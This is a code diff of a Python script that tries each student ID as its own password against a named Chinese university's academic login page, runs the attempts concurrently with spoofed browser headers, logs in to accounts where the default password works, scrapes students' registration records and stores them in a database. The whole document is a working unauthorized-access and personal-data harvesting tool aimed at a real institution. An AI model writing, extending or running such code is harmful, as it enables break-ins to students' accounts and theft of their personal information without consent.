@@ -49,12 +49,25 @@ class InfoValidate(object):
 
 	def validate(self, all_account):
 		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]
-		gevent.joinall(jobs, timeout=2)
+		gevent.joinall(jobs, timeout=settings.SECOND_TIMEOUT)
 
 	def validate_account(self, http, account):
 		param = {"zjh": account, "mm": account}
-		response = http.request('GET', settings.URL_LOGIN, fields=param)
+		headers = {
+			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+			'Accept-Encoding': 'gzip, deflate',
+			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+			'Cache-Control': 'max-age=0',
+			'Connection': 'close',
+			'Host': 'lgjwxt.hebust.edu.cn',
+			'Upgrade-Insecure-Requests': '1',
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
+		}
+		response = http.request('GET', settings.URL_LOGIN, fields=param, headers=headers)
 		print('发送请求>>{}'.format(param))
+		# fixme
+		print(response.status)
+		# fixme
 		res_text = response.data.decode('GB2312', 'ignore')
 
 		if res_text.__contains__('密码不正确'):
@@ -73,28 +86,38 @@ class InfoCollect(object):
 	def __init__(self):
 		self.http = urllib3.PoolManager()
 
-	def get_info(self, available):
-		accounts = available
-		for a in accounts:
-			# 先登录，获取 Cookie
-			param = {'zjh': a, 'mm': a}
-			response = self.http.request('GET', settings.URL_LOGIN, fields=param)
-			set_cookie = response.headers['Set-Cookie']
-			headers = {
-				'Cookie': set_cookie
-			}
-			response_xjxx = self.http.request('GET', settings.URL_XJXX, headers=headers)
-			text = response_xjxx.data.decode('GB2312', 'ignore')
+	def get_info_queue(self, accounts):
+		jobs = [gevent.spawn(self.get_info, a) for a in accounts]
+		gevent.joinall(jobs, timeout=settings.SECOND_TIMEOUT)
 
-			selector = etree.HTML(text)
-			text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
-			# 学籍信息
-			result = []
-			for info in text_arr:
-				result.append(info.strip())
-			self.save_info(result)
-			# 登出
-			self.http.request('POST', settings.URL_LOGOUT, headers=headers)
+	def get_info(self, stuid):
+		# 先登录，获取 Cookie
+		param = {'zjh': stuid, 'mm': stuid}
+		response = self.http.request('GET', settings.URL_LOGIN, fields=param)
+		set_cookie = response.headers['Set-Cookie']
+		headers = {
+			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+			'Accept-Encoding': 'gzip, deflate',
+			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+			'Cache-Control': 'max-age=0',
+			'Connection': 'close',
+			'Cookie': set_cookie,
+			'Host': 'lgjwxt.hebust.edu.cn',
+			'Upgrade-Insecure-Requests': '1',
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
+		}
+		response_xjxx = self.http.request('GET', settings.URL_XJXX, headers=headers)
+		text = response_xjxx.data.decode('GB2312', 'ignore')
+
+		selector = etree.HTML(text)
+		text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
+		# 学籍信息
+		result = []
+		for info in text_arr:
+			result.append(info.strip())
+		self.save_info(result)
+		# 登出
+		self.http.request('POST', settings.URL_LOGOUT, headers=headers)
 
 	def save_info(self, info):
 		db = InfoMain.db
@@ -121,7 +144,7 @@ class InfoMain(object):
 		validator.validate(all_account=all_account)
 		print(validator.account_available)
 		collector = InfoCollect()
-		collector.get_info(validator.account_available)
+		collector.get_info_queue(validator.account_available)
 		# 计算
 		num_sum = account.accounts.__len__()
 		num_valid = validator.account_valid.__len__()
@@ -137,4 +160,4 @@ class InfoMain(object):
 
 if __name__ == '__main__':
 	app = InfoMain()
-app.autorun()
+	app.autorun()
